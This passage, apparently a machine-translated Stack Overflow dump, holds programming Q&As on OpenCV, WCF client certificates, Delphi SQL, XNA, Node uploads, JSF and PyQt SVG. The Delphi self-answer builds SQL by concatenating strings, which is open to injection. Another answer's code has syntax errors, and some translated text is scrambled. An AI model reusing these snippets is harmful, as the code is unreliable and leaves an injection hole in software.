    //Para cada pixel en la fila los valores de magnitud y orientacion son calculados
        for(x=0;x<in.cols;x++){
            if(xSobelPtr==0){
                temp_gradient = ((atan(ySobelPtr[x]/(xSobelPtr[x]+0.00001)))*(180/PI)+90);
            }
            else{
                temp_gradient = ((atan(ySobelPtr[x]/xSobelPtr[x]))+(180/PI)+90);
            }
            temp_magnitude = sqrt((xSobelPtr[x] * xSobelPtr[x]) + (ySobelPtr[x] *       ySobelPtr[x]));
            float binStep = 180/ /*_nbins*/9;
                for (int i=1 ; i<=/*_nbins*/9 ; i++){
                    if (temp_gradient <= binStep*i){
                    binsRowPtrs[i-1][x] = temp_magnitude;
                    break;
                    }
                }
        }
     }

     for (int i = 0; i<_nbins;i++){
        integral(bins[i],integrals[i]);
     }

     for (int i = 0; i <_nbins ; i++){
        bins[i].release();
     }

    return integrals;
} 
```

程序可以编译，但是当我运行它时，它就停止了，调试器向我显示 SIGSEV 错误并显示第 61 行和第 38 行。

38 - extractIntegralHist(frame, 9);

61 - bins[9] = Mat::zeros(in.size(),CV_32F);

我无法查明问题，因为对我来说一切都很好，你能看一下代码吗？

编辑。更新。当函数 extractIntegralHist 运行时，程序似乎停止了，据称在（函数的）第 61 行。现在，我知道这是一个内存处理异常，但我找不到它有什么问题，而且我不明白调试器告诉我什么。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-14T18:26:44.477

线

```
bins[9] = Mat::zeros(in.size(),CV_32F); 
```

正在尝试访问 的第十个（注意零索引）元素`bins`。由于`_nbins`传入的值为`9`，因此超出了向量的范围。此外，如果您使用`.at()`而不是使用访问元素`[]`，这种错误将引发`out_of_range`异常，这对诊断问题应该更有帮助。

要将向量的每个元素分配给一个`cv::Mat`包含零的元素，请考虑将循环更改为

```
for (int i = 0; i < _nbins ; i++) {
    bins[i] = Mat::zeros(in.size(),CV_32F);
} 
```

或更简洁地说，删除循环并将`bins`初始化替换为

```
vector<Mat> bins(_nbins, Mat::zeros(in.size(),CV_32F)); 
```

请注意，您在初始化`integrals`.

# .net - 为什么我的客户端证书未包含在 TLS 握手中？

> ID：13125367
> 
> 赞同：3
> 
> 时间：2012-10-29T16:08:08.553
> 
> 标签：.net, vb.net, wcf, soap, wcf-security

几年前，我编写了一个 Windows 服务，它处理来自多个来源的数据，其中一个是第三方 SOAP Web 服务。它使用第三方提供的客户端证书通过此 Web 服务进行身份验证。这在当时运行良好，并且在它部署到的原始机器上仍然运行良好，但现在他们正在迁移到连接尝试引发异常并显示消息的新机器：

> 客户端身份验证方案“匿名”禁止 HTTP 请求

现在我的开发机器上也发生了同样的事情。这是配置与 Web 服务的连接的代码：

```
Friend Shared Function GetProperlyConfiguredConnection() As SEMOService.MIWebServiceClient
    ' Ensure that the settings are valid
    ValidateSettings()

    Dim destAddress As New System.ServiceModel.EndpointAddress(Url)
    ' The service uses SOAP 1.1 which is what BasicHttpBinding uses. WSHttpBinding uses SOAP 1.2.
    'Dim destBinding As New System.ServiceModel.WSHttpBinding
    Dim destBinding As New System.ServiceModel.BasicHttpBinding
    With destBinding
        .CloseTimeout = New TimeSpan(0, 1, 0)
        .OpenTimeout = New TimeSpan(0, 1, 0)
        .ReceiveTimeout = New TimeSpan(0, 10, 0)
        .SendTimeout = New TimeSpan(0, 1, 0)
        .BypassProxyOnLocal = False
        .HostNameComparisonMode = ServiceModel.HostNameComparisonMode.StrongWildcard
        .MaxBufferPoolSize = 524288
        .MaxReceivedMessageSize = 2147483647
        .MessageEncoding = ServiceModel.WSMessageEncoding.Text
        .TextEncoding = System.Text.Encoding.UTF8
        .UseDefaultWebProxy = True
        .AllowCookies = False

        With .ReaderQuotas
            .MaxDepth = 32
            .MaxStringContentLength = 2147483647
            .MaxArrayLength = 50000000
            .MaxBytesPerRead = 4096
            .MaxNameTableCharCount = 16384
        End With

        .Security.Mode = ServiceModel.BasicHttpSecurityMode.Transport
        .Security.Transport.ClientCredentialType = ServiceModel.HttpClientCredentialType.Certificate
    End With

    Dim wcfService As New SEMOService.MIWebServiceClient(destBinding, destAddress)

    ' Load the certificate from the specified file.
    Dim keyData As Byte()
    Dim keyFileInfo As New IO.FileInfo(SEMOServiceSettings.KeyFilePath)
    Dim keyFileReader As New IO.BinaryReader(New IO.FileStream(SEMOServiceSettings.KeyFilePath, IO.FileMode.Open, IO.FileAccess.Read))
    keyData = keyFileReader.ReadBytes(keyFileInfo.Length)
    keyFileReader.Close()

    Dim cert As New X509Certificates.X509Certificate2
    cert = New X509Certificates.X509Certificate2(keyData, SEMOServiceSettings.KeyFilePassword)

    wcfService.ClientCredentials.ClientCertificate.Certificate = cert

    Return wcfService
End Function 
```

它实际上不是 WCF Web 服务，但在从 WSDL 自动生成客户端代码时，Visual Studio 似乎并不介意。客户端证书是从文件而不是从证书存储中加载的。所有机器上都在使用相同的证书文件，并且在单步执行代码时似乎可以正常加载。

我将使用 WireShark 的机器发出的请求与我的开发机器发出的请求进行了比较，似乎客户端证书没有包含在握手中，而应该是：

[没有客户证书](https://i.imgur.com/meZa2.png)

这是来自有效机器上的请求的相应数据包：

[完整的证书链](https://i.imgur.com/zMchd.png)

有很多关于 WCF、SOAP 和密码学的内容我不了解，所以对于导致这种行为的环境可能有什么不同，以及需要改变什么来纠正它，我有点茫然。

[这个问题](https://stackoverflow.com/questions/4090975/how-to-force-wcf-client-to-send-client-certificate)似乎是相关的，但我似乎无法`RequireClientCertificate`通过代码访问任何属性，并且没有使用 app.config 来配置绑定。

可以向 ServicePointManager 类添加回调，以执行服务器证书的自定义验证。在将客户端证书发送到服务器之前，基客户端类或绑定是否对客户端证书进行了一些验证？如果是这样，有没有一种方法可以以与服务器证书验证相同的方式干预该过程，以便我可以看到发生了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-02T15:45:33.443

我找到了解决方案，但我不确定我是否完全理解它。问题是客户端证书（或者可能只是链中的一些其他证书）需要存在于发出请求的用户的个人证书存储中。我以运行 Windows 服务的用户身份登录，将证书导入其存储区，现在一切正常。

这表明客户端证书以某种方式得到验证，即使它们是从文件中加载的，而不是在存储中引用的。这实际上在 ProcMon 的输出中很明显，如果我更加注意，我会意识到它正在搜索证书存储并提出 NOT FOUND 结果。

如果 Microsoft 的 WCF 客户端代码在证书有问题时抛出异常，而不是仅仅尝试在没有证书的情况下继续进行，那就太好了。呃，好吧...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-18T14:10:51.370

我在使用需要在 Windows 7 服务器上的传输级别进行证书身份验证的第三方 Web 服务时遇到了同样的问题。我们必须在套接字级别设置跟踪以找到根本原因，即在自定义应用程序 ID 下运行的服务使用者无权读取客户端证书上的私钥。我们看到证书正在被发现，但由于无法读取私钥，AcquireCredentailsHandle 将失败并出现错误 0X8009030D。

套接字跟踪：

```
System.Net Information: 0 : [5708] SecureChannel#15271547 - Certificate is of type     X509Certificate2 and contains the private key.
ProcessId=6572
ThreadId=1
DateTime=2013-12-18T03:01:54.0189534Z
Timestamp=38085697406996
System.Net Information: 0 : [5708] AcquireCredentialsHandle(package = Microsoft Unified Security Protocol Provider, intent  = Outbound, scc     = System.Net.SecureCredential)
ProcessId=6572
ThreadId=1
DateTime=2013-12-18T03:01:54.0194535Z
Timestamp=38085697408545
System.Net Error: 0 : [5708] AcquireCredentialsHandle() failed with error 0X8009030D.
ProcessId=6572
ThreadId=1
DateTime=2013-12-18T03:01:54.0724641Z
Timestamp=38085698170444 
```

一旦我们授予我们的应用程序 ID 访问私有密钥的权限，它就能够完成 tls 握手并将我们的证书发送到服务。在 Windows 7 服务器中授予对私钥的访问权限比以前在 xp 机器上要容易得多。只需在 mmc 中打开证书存储，找到您的客户端证书，然后右键单击 alltask-->manage private keys

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T13:36:56.270

似乎这可能是他们新服务器的部署问题。我之所以这么说，是因为“它以前有效”。我会让他们检查配置，特别是应用程序池和应该运行它的应用程序/用户帐户。他们很有可能将服务安装在无权访问某些内容的系统或本地服务下。在许多情况下，我看到他们复制所有内容的部署，包括服务/用户帐户，但从未创建帐户！这会给你这个错误，如果服务没有权限访问机器证书或运行链，它永远不会请求客户端发送证书！

查看[“客户端身份验证方案‘匿名’禁止 HTTP 请求？](http://fangdahai.blogspot.com/2011/01/http-request-was-forbidden-with-client.html)

编辑：回答你的其他问题，我以前没有......客户端在发送之前不会对客户端证书进行任何类型的检查，除了它使用证书在消息凭据模式下签署消息。您的客户端确实验证了服务，如果您使用的是服务凭据，特别是，如果您在服务中使用证书（甚至通过 IIS 的 SSL），您的 WCF 客户端将确保证书是受信任的并且在允许任何通信之前存储在存储中.

我从未见过任何创建自定义客户端服务验证器的方法，但是最好的办法是打开客户端[诊断跟踪和消息日志记录](http://msdn.microsoft.com/en-us/library/cc185440%28v=bts.10%29.aspx)，然后从那里进行分析。

EDIT2：好的，所以我也没有读到你的问题。我会假设您的原始服务作为服务帐户运行，可能是网络服务（因为这是最有意义的，对吧？）。好吧，事实证明，在较新版本的 Windows 中，一些内置服务帐户已受到阻碍，以帮助防止安全问题，例如机器人等，它们会做类似于您正在尝试做的事情。最重要的是，根据您的设置，您正在使用代理，我敢猜测可能需要 Windows 身份验证才能工作。我建议遵循“正确”的做事方式，并为该服务创建一个特定的服务用户。如果您将服务设置为“本地系统”运行，我愿意打赌它可能会工作（尽管不确定代理）。

# sql - 德尔福 SQL 查询

> ID：13125373
> 
> 赞同：0
> 
> 时间：2012-10-29T16:08:37.767
> 
> 标签：sql, delphi, datetime

我想知道您是否可以看一下我在 Delphi 上进行日期比较的代码。

DELPHI 中的代码片段：-

```
 // SQL QUERY to gather member information.
           DMS.ADOQuery1.SQL.Clear;
           DMS.ADOQuery1.SQL.Add('select HPFROMDT, HPthruDt, MEMBERKEY, MEMBHPKEY, OPFROMDT, OPTHRUDT, HPCODEKEY' +
                                 ' from MEMBHP' +
                                 ' where MEMBERKEY = ''' + MembKey + '''   and OPFROMDT <= ''' + date_request + ''' and OPTHRUDT > ''' + date_request +''' ' 
```

SQL 中的脚本片段：-

```
SELECT [MEMBHPKEY]
      ,[MEMBERKEY]
      ,[CURRHIST]
      ,[HPFROMDT]
      ,[OPFROMDT]
      ,[OPTHRUDT]
      ,[HPCODEKEY]
      ,[HPOPTIONKEY]

  FROM [main].[dbo].[*****]

  where MEMBERKEY = '1234567' and OPFROMDT <= '2007-08-01' and OPTHRUDT > '2007-08-01' 
```

SQL 脚本显然将固定日期值与提取的日期值进行比较。它有效！

但是，Delphi 代码不起作用。错误信息

> *将字符串转换为 smalldatetime 日期类型时转换失败。*

我相信 Delphi 必须有某种转换技术，可以让我转换成正确的变量类型……。有任何想法吗？

我从文本文件中提取`date_request`为字符串变量....

```
 for i := 11 to length(buffer) do
                        begin
                             DT_request := DT_request + buffer[i];
                        end; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:22:03.843

使用日期（`TDateTime`值）来表示日期，并使用参数化查询让数据库驱动程序将它们转换为正确的格式。

```
// New code snippet from Delphi:
DMS.ADOQuery1.SQL.Clear;
DMS.ADOQuery1.SQL.Add('select HPFROMDT, HPthruDt, MEMBERKEY, MEMBHPKEY, OPFROMDT, OPTHRUDT, HPCODEKEY');
DMS.ADOQuery1.SQL.Add('from MEMBHP where MEMBERKEY = :MembKey and OPFROMDT <= :date_request and');
DMS.ADOQuery1.SQL.Add('and OPTHRUDT > :date_request');
DMS.ADOQuery1.Parameters.ParamByName('MembKey'.AsString := MembKey;
DMS.ADOQuery1.Parameters.ParamByName('date_request').AsDateTime := ARealDateTimeValue;
DMS.ADOQuery1.Parameters.ParamByName('date_request') := ARealDateTimeValue; 
```

如果您从文本文件中获取字符串，您必须首先确保它的格式适合您的数据库。根据您的信息，那将是`CCYY-MM-DD`格式。然后，您可以使用`AsString`而不是`AsDateTime`将值分配给参数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:14:55.637

使用参数...

```
AdoQuery1.SQL.TExt:
Declare @Date smalldatetime
Select @Date=:Date
SELECT [MEMBHPKEY]
       ,[MEMBERKEY]
       ,[CURRHIST]  
       ,[HPFROMDT]
       ,[OPFROMDT]
       ,[OPTHRUDT]
       ,[HPCODEKEY]
       ,[HPOPTIONKEY] 
FROM [main].[dbo].[MEMBHP]
where MEMBERKEY =:memberkey and OPFROMDT <= @Date and OPTHRUDT > @Date

AdoQuery1.Parameters.ParseSQL(AdoQuery1.SQL.TExt,true);
AdoQuery1.Parameters.ParamByName('Date').DataType := ftDatetime;
AdoQuery1.Parameters.ParamByName('Date').Value := StrToDate('1.1.2012');
AdoQuery1.Parameters.ParamByName('memberkey').Value := 123; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:43:38.577

提取过程在日期结束时拾取垃圾“*”值。这是 SQL 中日期比较期间的问题。

我用了

```
Showmessage(DMS.ADOQuery1.SQL[0]); 
```

它向我表明 date_request 实际上导致了'20070815 *'......一旦我弄清楚了，这很容易解决。删除 '*' 并像以前一样进行比较。

```
// SQL QUERY to gather member information.
DMS.ADOQuery1.SQL.Clear;
DMS.ADOQuery1.SQL.Add('select HPFROMDT, HPthruDt, MEMBERKEY, MEMBHPKEY, OPFROMDT, OPTHRUDT, HPCODEKEY' +
                       ' from MEMBHP' +
                       ' where MEMBERKEY = ''' + MembKey + '''   and OPFROMDT <= ''' + date_request + ''' and OPTHRUDT > ''' + date_request +''' ' 
```

# c# - 如何访问 Asp.net 中的虚拟目录？

> ID：13125377
> 
> 赞同：0
> 
> 时间：2012-10-29T16:08:53.193
> 
> 标签：c#, asp.net, virtual-directory

我在 IIS 中创建了一个虚拟目录。我的项目托管在 D:/ 中，我想从我的项目中访问 C:/。因此，我在 IIS 中为 C:/ 创建了一个虚拟目录。现在，我如何从 Asp.net 访问这个虚拟目录？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:11:17.867

您误解了虚拟目录。

虚拟目录允许**客户端**访问来自服务器的资源。
**您不应该创建`C:\`虚拟目录。**

您的 ASP.Net**服务器端**代码可以访问服务器文件系统中的任何内容，无需任何特殊配置。

# mysql - 使用 SUM ... CASE 优化选择

> ID：13125379
> 
> 赞同：0
> 
> 时间：2012-10-29T16:09:02.130
> 
> 标签：mysql, sql, query-optimization, sql-optimization

有没有办法优化这个查询：

```
select 
orders_id,
orders_products_id,
sum(CASE products_options_id WHEN 1 THEN products_options_values_id ELSE 0 END) as color,
sum(CASE products_options_id WHEN 2 THEN products_options_values_id ELSE 0 END) as talle

from 
orders_products_attributes 

group by 
orders_products_id 
```

这是解释输出：

```
id  select_type   table                       type   possible_keys   key   key_len   ref     rows   Extra
1   SIMPLE        orders_products_attributes  ALL    NULL            NULL  NULL      NULL  69006  Using temporary; Using filesort 
```

谢谢！

卢西亚诺

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:22:56.900

我建议使用列（orders_product_id、products_options_id、orders_id）为此查询创建一个覆盖索引。

```
CREATE INDEX ix_opa_opid_poid_oid
    ON orders_products_attributes (orders_product_id, products_options_id, orders_id) 
```

# c# - LoadContent 在 XNA 游戏中永远不会被调用

> ID：13125381
> 
> 赞同：1
> 
> 时间：2012-10-29T16:09:06.133
> 
> 标签：c#, xna, initialization

我有一个使用 XNA（用 C# 编写）创建的 WindowsGameLibrary。它包括自己对 Game 类的扩展。无论出于何种原因，LoadContent 的覆盖版本永远不会被调用。我在论坛中读到，这可能是由于意外覆盖 Initialize 而没有在最后添加 base.Initialize() 造成的，但我确保拥有它，但它仍然不起作用。我会注意到包含 Game 扩展名的命名空间与其中包含“Program”类的实际 WindowsGame 项目的命名空间是分开的，尽管我认为这无关紧要。下面是我的代码：

```
 public AttunedGame()
    {
        // Singleton
        if (Instance == null) Instance = this;
        this.currentArea = "";
    }
    protected override void Initialize()
    {
        // Managers
        graphics = new GraphicsDeviceManager(this);
        currentGameTime = new GameTime(new TimeSpan(0), new TimeSpan(0));

        // Areas
        areas = new CollectibleCollection<Area>();
        foreach (string a in Directory.EnumerateDirectories(@"content\areas"))
        {
            areas.Add(new Area(a));
            areas.Get(Collectible.IDFromPath(a)).Initialize();
        }

        base.Initialize();
    }
    protected override void LoadContent()
    {
        spriteBatch = new AnimatedSpriteBatch(this.GraphicsDevice);
    }

    // Main loop methods
    protected override void Update(GameTime gameTime)
    {
        currentGameTime = gameTime;

        CurrentArea.Update();

        base.Update(gameTime);
    }
    protected override void Draw(GameTime gameTime)
    {
        currentGameTime = gameTime;

        SpriteBatch.Begin();
        CurrentArea.Draw();
        SpriteBatch.End();

        base.Draw(gameTime);
    } 
```

我在此处显示的每个方法中都放置了断点，以查看程序流向何处。它首先命中构造函数，然后是 Initialize（我一次通过一行直到结束），然后进入 Update，然后是 Draw。我什至让它循环了一段时间，它从来没有到达 LoadContent。

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T19:48:51.763

您实际上需要在构造函数中创建 GraphicsDeviceManager。移动线：

```
 graphics = new GraphicsDeviceManager(this); 
```

从内部

```
 protected override void Initialize() 
```

在里面

```
 public AttunedGame() 
```

我的猜测是 XNA 内部的某些东西需要在加载内容之前初始化图形设备管理器（可能服务容器希望制作图形设备以便它可以加载诸如纹理之类的内容）。LoadContent 实际上是从基类 Initialize 调用的，这可能以某种方式失败；它确实应该抛出某种异常，但他们可能没想到会出现这种情况。

希望有帮助！

# node.js - 上传巨大的文件 > 2GB 到 nodejs (n Firefox)

> ID：13125389
> 
> 赞同：2
> 
> 时间：2012-10-29T16:09:33.347
> 
> 标签：node.js, file-upload

我已经把我的例子尽可能地简单化了。我尝试将超过 2 GB 的大文件上传到我的服务器，但**仅在 Firefox 中**收到错误。在 Chrome 中似乎可以正常工作。它说类似“错误：连接断开”。有人可以解释我为什么以及我能做些什么吗？

```
var http       = require("http");
var url        = require("url");

http.createServer(function (request, response) {
    switch(url.parse(request.url).pathname) {
        case "/":
            displayForm(request, response);
            break;
        case "/upload":
            response.writeHeader(200, {"Content-Type":"text/html"});
            response.end(
                '<h1>File Uploaded!</h1>'
            );
            break;
    }
}).listen(1234);

var displayForm = function(request, response) {
    response.writeHeader(200, {"Content-Type":"text/html"});
    response.end(
        '<form action="/upload" method="post" enctype="multipart/form-data">' +
            '<input type="file" name="uploadFile">' +
            '<input type="submit" value="Upload!">' +
        '</form>'
    );
}; 
```

**编辑**：我刚刚意识到它只发生在**Firefox**中，而不是 Chrome 中！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:16:02.570

对于如此大的文件，我建议您使用 读取文件，使用or将`FileReader`其分块为小的二进制文件，并使用进度条逐块传输（通过 Socket.io）文件块，连接服务器上的块。发送最后一个块时-您在后端获得了完整文件。`Blob``Blobbuilder`

您还可以将当前块号保存在 cookie/LocalStorage 中，以防连接中断以继续传输。

PS 对于古老的 IE 和其他垃圾，有使用 Blob 的 flash 插件，谷歌它。

不同浏览器的 POST 请求的 PSS 最大文件大小：http: [//motobit.com/help/scputl/pa98.htm](http://motobit.com/help/scptutl/pa98.htm)

# ajax - JSF 在操作方法之前更新支持 bean 属性

> ID：13125392
> 
> 赞同：0
> 
> 时间：2012-10-29T16:09:40.500
> 
> 标签：ajax, jsf, jsonp

我通过 JSONP 获取一个值到我的网页。现在我想用这个值更新一个 backing-bean-property？如何处理？提前致谢。

更新：好的，我的问题是有 JavaScript、JSF-Ajax-Calls 和 Web 服务，我必须看看什么时候触发了哪个动作。我想我需要更详细地描述我的情况。

我的支持豆：

```
logger.debug("CaseController - save(): tempCaseId [ " + tempIshCaseId + "];"); 
```

我的 xhtml 页面：

```
<!-- JSONP-Wert in die Bean hieven -->
<t:div id="tempIshCaseIdContainer">
    <h:outputText id="setTempIshCaseId" value="#{CaseController.tempIshCaseId}" />
</t:div>
<a4j:commandLink id="preSaveCaseButton" onclick="setTempIshCaseId();" title="..."
    reRender="jsonpRemoteURLs,hNumberRemoteURL,eNumberRemoteURL,ishCaseRemoteURL,tempIshCaseIdContainer" oncomplete="jQuery('a#form_saveCaseButton').click()">
</a4j:commandLink>
<a4j:commandLink id="saveCaseButton" title="..." reRender="serverWarningsParent"  action="#{CaseController.save}" onclick="if (validateCaseFormEntries(){ closeCaseWarningsBox(); } else { return false; }" oncomplete="if (#{CaseController.success}){ showCaseModalPanel(); patientConsistencyCheck(#{NavigationController.globalErrorState}, '#{PatientController.patienlistUrl}'); startJsonpSetters(); saveCase(); initializeFocusBlurEvents();} else { return false;}">
</a4j:commandLink>
<a4j:commandLink id="postSaveCaseButton" onclick="hideCaseModalPanel();" reRender="caseContainer,modifiedContainer">
</a4j:commandLink> 
```

我的 Javascript 文件：

```
function setTempIshCaseId(){// setze den Wert des a4j-value-Elements
var ishCaseId = jQuery('#form_ish').val();
jQuery('#form_setTempIshCaseId').text(ishCaseId);
} 
```

页面渲染后我得到了三个阶段。preSaveCaseButton 应该更新所有 JSONP-Urls，这是必要的，因为否则系统将产生 Token-Timeouts 并且将引发异常。saveCaseButton 将触发 bean-action 并将编辑的 setTempIshCaseId 保存到数据库，如果它是有效的。总而言之，我想我只需要确保在调用 preSaveCaseButton 时我更新了 bean，如您所见，我尝试使用“进程”属性。在将调用 saveCaseButton 之后，我可以检查 bean 值。不幸的是，我的 log4j-logging-message 告诉我，我的支持 bean 的值为 '' (tempIshCaseId = '') 并且没有更新。

该怎么做才知道？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:17:26.950

只需发送具有该值的请求参数。目前尚不完全清楚您是如何提交表单的，但您可以使用其他`<h:inputHidden>`方式。

```
<h:inputHidden id="hidden" value="#{bean.property}" /> 
```

在 JS 端，只需将其值更改为获取的值，如下所示：

```
document.getElementById("form:hidden").value = fetchedValue; 
```

# python - 在 SVG 中编写脚本以在 python 中使用的替代方法

> ID：13125398
> 
> 赞同：0
> 
> 时间：2012-10-29T16:09:58.190
> 
> 标签：python, svg, pyqt4, interactive

有没有办法在 svg 文件中实现类似于脚本的东西，所以它在 python gui 中打开时可以工作？我需要类似于此[示例](http://www.petercollingridge.co.uk/interactive-svg-components/tooltip)中的功能，但我在 python 中打开我的 svg，如下所示：

```
self.setScene(QtGui.QGraphicsScene(self))
self.scene().addItem(QtSvg.QGraphicsSvgItem(QtCore.QFile(pathToMySVG).fileName())) 
```

`self`在哪里`QtGui.QGraphicsView`。

我也尝试过不编写脚本，使用这些[示例](http://www.ibm.com/developerworks/library/x-svgint/)，但仍然没有交互性。

任何帮助示例将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-30T15:31:50.587

@Vicent 实际上我找到了使用 QGraphicsWebView() 的解决方案：

```
import sys
from PyQt4 import QtCore, QtGui, QtSvg
from PyQt4.QtWebKit import QGraphicsWebView
if __name__ == "__main__":
    app = QtGui.QApplication(sys.argv)

    scene = QtGui.QGraphicsScene()
    view = QtGui.QGraphicsView(scene)

    br = QtSvg.QGraphicsSvgItem("C:\my_interactive_svg.svg").boundingRect()

    webview = QGraphicsWebView()
    webview.load(QtCore.QUrl("C:\my_interactive_svg.svg"))
    webview.setFlags(QtGui.QGraphicsItem.ItemClipsToShape)
    webview.setCacheMode(QtGui.QGraphicsItem.NoCache)
    webview.resize(br.width(), br.height())

    scene.addItem(webview)
    view.resize(br.width()+10, br.height()+10)
    view.show()
    sys.exit(app.exec_()) 
```

它非常适合我（脚本和其他东西）。

唯一我不喜欢的是我必须将我的 svg 加载为 QGraphicsSvgItem，因为我不知道其他方法来获取我的 svg 的大小。显然`webview.size()`不返回预期值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T20:17:31.010

根据[QtSvg 模块文档](http://www.riverbankcomputing.co.uk/static/Docs/PyQt4/html/qtsvg.html)：

> Qt 支持 SVG 1.2 Tiny 的静态特性。目前不支持 ECMA 脚本和 DOM 操作。

因此，如果您要使用该`QtSvg`模块，则仅限于[此处](http://www.w3.org/Graphics/SVG/feature/1.2/#SVG-static)描述的静态功能。

**更新**：

@Aleksandar 阅读您的答案后，我进一步调查以删除对`QtSvG`模块的依赖关系。下面的代码实现了这个目标（诀窍是在调整容器大小之前加载图像）：

```
import sys
from PyQt4 import QtCore
from PyQt4 import QtGui
from PyQt4.QtWebKit import QGraphicsWebView
class Scene(QtGui.QGraphicsScene):
    def __init__(self):
        super(QtGui.QGraphicsScene, self).__init__()
        self.view = QtGui.QGraphicsView(self)

        self.webview = QGraphicsWebView()
        self.webview.setFlags(QtGui.QGraphicsItem.ItemClipsToShape)
        self.webview.setCacheMode(QtGui.QGraphicsItem.NoCache)
        self.addItem(self.webview)

        self.webview.loadFinished.connect(self.svgLoaded)

    def svgLoaded(self):
        frame = self.webview.page().mainFrame()
        fsize = frame.contentsSize()
        self.webview.resize(QtCore.QSizeF(fsize))
        self.view.resize(fsize.width() + 10, fsize.height() + 10)

if __name__ == "__main__":
    app = QtGui.QApplication(sys.argv)
    v = Scene()
    svg = QtCore.QUrl("Bitmap_VS_SVG.svg")
    v.webview.load(svg)
    v.view.show()
    sys.exit(app.exec_()) 
```

代码可能需要更多的爱，但我现在没有时间。无论如何，我希望它对你有用。

# c++ - 为什么我在 linux 的 C++ 中得到错误的当前目录

> ID：13125403
> 
> 赞同：0
> 
> 时间：2012-10-29T16:10:06.440
> 
> 标签：c++, c, netbeans

我使用 NetBeans 编程 C++ ，我想获取可执行文件的当前绝对路径

`(~/NetBeansWorkSpace/project_1/dist/Debug/GNU-Linux-x86/executableFileName)`

所以我用

1、 `system("pwd")`

2、`getcwd(buffer,bufferSize)`

然后单击运行按钮，但它们都得到了错误的路径：~/NetBeansWorkSpace/project_1

这是惊喜，我运行 bash

`cd ~/NetBeansWorkSpace/project_1/dist/Debug/GNU-Linux-x86/executableFileName`

`./executableFileName`

我得到了正确的路径。

这是为什么？？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:34:18.630

正如其他人所说，NetBeans 在运行您的应用程序之前设置工作目录。如果您想获取可执行文件的工作目录，我相信以下应该可以工作。

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char const* *argv) {
    char *resolved = realpath(argv[0], NULL);
    if (resolved != NULL) {
        char *fname = strrchr(resolved, '/');
        if (fname != NULL) {
            fname[1] = '\0';
        }
        printf("absolute path of %s is %s\n", argv[0], resolved);
        free(resolved);
    } else {
        perror("realpath");
    }
    return EXIT_SUCCESS;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:13:26.467

没有任何问题 - NetBeans 正在运行您的程序，当前工作目录设置为项目目录 ( `~/NetBeansWorkSpace/project_1`)。

您的程序不应依赖于与您的程序所在目录相同的当前目录。如果您想查看获取程序绝对路径的几种不同方法，请参阅[此线程。](https://stackoverflow.com/questions/1528298/get-path-of-executable)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-03-24T11:12:13.850

Linux：
执行系统命令的函数

```
int syscommand(string aCommand, string & result) {
    FILE * f;
    if ( !(f = popen( aCommand.c_str(), "r" )) ) {
            cout << "Can not open file" << endl;
            return NEGATIVE_ANSWER;
        }
        const int BUFSIZE = 4096;
        char buf[ BUFSIZE ];
        if (fgets(buf,BUFSIZE,f)!=NULL) {
            result = buf;
        }
        pclose( f );
        return POSITIVE_ANSWER;
    } 
```

然后我们得到应用名称

```
string getBundleName () {
    pid_t procpid = getpid();
    stringstream toCom;
    toCom << "cat /proc/" << procpid << "/comm";
    string fRes="";
    syscommand(toCom.str(),fRes);
    size_t last_pos = fRes.find_last_not_of(" \n\r\t") + 1;
    if (last_pos != string::npos) {
        fRes.erase(last_pos);
    }
    return fRes;
} 
```

然后我们提取应用路径

```
 string getBundlePath () {
    pid_t procpid = getpid();
    string appName = getBundleName();
    stringstream command;
    command <<  "readlink /proc/" << procpid << "/exe | sed \"s/\\(\\/" << appName << "\\)$//\"";
    string fRes;
    syscommand(command.str(),fRes);
    return fRes;
    } 
```

之后不要忘记修剪线

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-29T16:12:23.180

NetBeans通过为通向它`~/NetBeansWorkSpace/project_1/`的路径添加前缀来启动您的应用程序。`dist/Debug/GNU-Linux-x86/`

打开 shell，执行 cd `~/NetBeansWorkSpace/project_1/`，然后执行`dist/Debug/GNU-Linux-x86/executableFileName`，您将获得与从 NetBeans 运行应用程序相同的结果。

# solaris - solaris (bourne?) 中 ^ (caret) 的特殊含义 sh?

> ID：13125406
> 
> 赞同：2
> 
> 时间：2012-10-29T16:10:11.077
> 
> 标签：solaris, sh

在 Solaris 上，看来我需要单引号“匹配行首”表达式：

```
 > sh
 $ echo offset 0.000000 2>&1 | grep ^offset | tail -1
 offset: not found
 $ Usage:        grep [-c|-l|-q] [-bhinsvwx] pattern_list [file ...]
         grep [-c|-l|-q] [-bhinsvwx] [-e pattern_list]... [-f pattern_file]... [file...]
         grep -E [-c|-l|-q] [-bhinsvx] pattern_list [file ...]
         grep -E [-c|-l|-q] [-bhinsvx] [-e pattern_list]... [-f pattern_file]... [file...]
         grep -F [-c|-l|-q] [-bhinsvx] pattern_list [file ...]
         grep -F [-c|-l|-q] [-bhinsvx] [-e pattern_list]... [-f pattern_file]... [file...] 
```

我可以通过单引号正则表达式很容易地解决这个问题：

```
 > sh
 $ echo offset 0.000000 2>&1 | grep '^offset'| tail -1
 offset 0.000000 
```

我在自己使用 bash 的命令行中没有看到这一点，但它显示在脚本中，例如使用 system() 的 perl 脚本。

那个默认的 Solaris shell 是 Bourne shell 吗？^（插入符号）在默认 Solaris shell 的 shell 语言中还有什么其他含义？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T16:39:02.560

